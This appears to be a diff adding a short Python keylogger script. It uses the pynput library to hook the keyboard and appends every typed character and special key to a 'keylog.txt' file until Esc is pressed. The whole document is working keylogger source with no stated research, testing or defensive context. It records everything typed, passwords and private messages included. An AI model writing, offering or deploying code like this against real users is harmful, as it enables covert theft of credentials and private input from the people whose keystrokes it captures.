@@ -1,0 +1,45 @@
+import sys
+import os
+import platform
+
+# Check if running in a supported environment
+if platform.system() == "Linux" and not os.environ.get("DISPLAY"):
+    print("Error: No X server detected. This script requires a graphical environment.", file=sys.stderr)
+    sys.exit(1)
+
+try:
+    from pynput import keyboard
+except ImportError as e:
+    print("Error: pynput is not supported in this environment. Ensure required dependencies are installed.", file=sys.stderr)
+    print(f"Details: {e}", file=sys.stderr)
+    sys.exit(1)
+
+# Define log file path
+log_file = os.path.join(os.getcwd(), "keylog.txt")
+
+def write_to_log(data):
+    try:
+        with open(log_file, "a", encoding="utf-8") as f:
+            f.write(data)
+    except Exception as e:
+        print(f"Error writing to log file: {e}", file=sys.stderr)
+
+def on_press(key):
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            write_to_log(key.char)
+        else:
+            write_to_log(f'[{key}]')
+    except Exception as e:
+        print(f"Error processing key press: {e}", file=sys.stderr)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+try:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+except Exception as e:
+    print(f"Unexpected error: {e}", file=sys.stderr)
+    sys.exit(1)
